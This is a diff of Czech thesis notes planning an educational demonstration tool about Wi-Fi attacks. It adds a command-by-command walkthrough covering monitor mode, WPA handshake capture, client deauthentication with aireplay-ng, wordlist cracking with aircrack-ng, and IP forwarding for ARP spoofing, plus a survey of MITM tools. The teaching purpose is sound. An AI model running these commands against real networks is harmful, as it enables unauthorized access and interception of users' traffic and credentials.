@@ -94,17 +94,19 @@ Cílem práce je navrhnout a implementovat demonstrační nástroj k popisu a  v
         - kdykoliv posluchač zahlédne konzolové okno, tak vypíná mozek
         - důraz demonstračního nástroje je nejen na ukázání toho, že Wi-Fi může být "hacknuta" relativně jednoduše, doslova na pár kliknutí, ale také musí být nezbytnou součástí doplňující text s vysvětlivkami a možnostmi mitigace jednotlivých kroků útoku (např. v části lámání hesla by měly být zobrazeny i stručně zásady bezpečného hesla apod.) - **GUI je nezbytné!** 
 ---
-- :heavy_check_mark: "Průmyslový standard" MITM útoku:
+## "Průmyslový standard" MITM útoku: :heavy_check_mark:
+https://linuxhint.com/install_aircrack-ng_ubuntu/
 1. Přepnutí adaptéru do monitorovacího módu:  
     - Zjištění názvu adaptéru
         ```s
         iwconfig
         ```
+        ![iwconfig](https://linuxhint.com/wp-content/uploads/2019/01/2-18.png)
         standarně bude mít název _wlan0_ a bude mít _Mode: Managed_
     - Vypnutí (zapnutí adaptéru)
         ```s
         ifconfig wlan0 down(up)
-        ```
+        ```   
     - Přepnutí zvoleného adaptéru do monitorovacího módu:
         ```s
         sudo airmon-ng start wlan0
@@ -114,22 +116,26 @@ Cílem práce je navrhnout a implementovat demonstrační nástroj k popisu a  v
         ```s
         service NetworkManager restart
         ```
+        ![iwconfig](https://linuxhint.com/wp-content/uploads/2019/01/3-18.png)
+        ![iwconfig](https://linuxhint.com/wp-content/uploads/2019/01/4-19.png)
 2. Zachytíme EAPOL rámce s přihlašovacími údaji
     - Start zachytávání všech paketů v dosahu - skenování okolí
         Toto zachytí rámce s MAC adresou AP
         ```s
         sudo airodump-ng wlan0mon
         ```
+        ![iwconfig](https://linuxhint.com/wp-content/uploads/2019/01/5-19.png)
         Po zvolení požadovaného cílového AP (-d == --bssid) a kanálu (-c), záchyt zapíšeme do souboru pro pozdější analýzu např. ve Wiresharku (s filtrem EAPOL pro vyfiltrování WPA handshaku)
         ```s
         sudo airodump-ng -c11 -d :::BB:02 -w SOUBOR wlanmon
         ```
         NECHÁME BĚŽET V JEDNOM OKNĚ...
-    - Ve druhém okně spustíme deautentizaci cíle:
+    - Ve DRUHÉM OKNĚ spustíme deautentizaci cíle:
         -c = client, -a = access point
         ```s
         sudo aireplay-ng --deauth 0 -c ::::phone -a :::BB:02 wlan0mon 
         ```
+        ![iwconfig](https://linuxhint.com/wp-content/uploads/2019/01/6-18.png)
         To zapříčiní opětovnou snahu cíle (-c) o připojení se a poslání EAPOL paketů, které jsou zachyceny v prním okně...
 3. Úklid
     - Vypnu monitorovací mód a opět zapnu standardní chování Wi-Fi (Managed mode)
@@ -147,13 +153,43 @@ Cílem práce je navrhnout a implementovat demonstrační nástroj k popisu a  v
     ```s
     aircrack-ng SOUBOR.cap -w /usr/share/wordlists/rockyou.txt 
     ```
+    ![iwconfig](https://linuxhint.com/wp-content/uploads/2019/01/8-17.png)
 5. Máme heslo od Wi-Fi -> můžeme se připojit a začít páchat neplechu:
     - ARP spoofing
-        - -> skenování sítě: **nmap** **TODO**:x:
-        - -> Sociální inženýrství: falešné přihlašovací okno **TODO**:x:
-        - -> SSL split - **TODO**:x:
-    
-- Nástroje automatizující MITM útoky:
+    Zapnutí forwardování
+    ```
+    cat /proc/sys/net/ipv4/ip_forward
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    ```  
+    - -> skenování sítě: **nmap** **TODO**:x:
+    - -> Sociální inženýrství: falešné přihlašovací okno **TODO**:x:
+    - -> SSL split - **TODO**:x:
+    - krádež cookies, credentials
+---    
+## Nástroje automatizující MITM útoky:
+### 1. Ettercap
+https://www.youtube.com/watch?v=CW0Mf9qGBOc
+Aplikace použitelná až po připojení k síti. Nepopisuje jednotlivé kroky útoku. Zaznamenává traffic, který je potřeba posléze analyzovat např. Wiresharkem
+```
+sudo ettercap -G
+```
+- GUI aplikace :check:
+- bez doprovodn0ho infa a bez vysvětlivek :x:
+    ![Alt text](image.png)
+
+    ![Alt text](image-1.png)
+
+### 2. bettercap
+https://www.hackers-arise.com/post/wi-fi-hacking-part-17-wi-fi-hacking-with-bettercap
+- Mocný nástroj splňující všechny požadavky
+- Konzolový bez GUI :x:
+    ![Alt text](6a4a49_9bf90ed3320b40b19ab7661298e9a76b~mv2.png)
+
+### 3. Wifiphisher
+https://www.youtube.com/watch?v=ay-77C9ZZQM
+- tool pro tvorbu předdefinovaných phishingových útoků na WiFi sítě. 
+
+
 
 
 
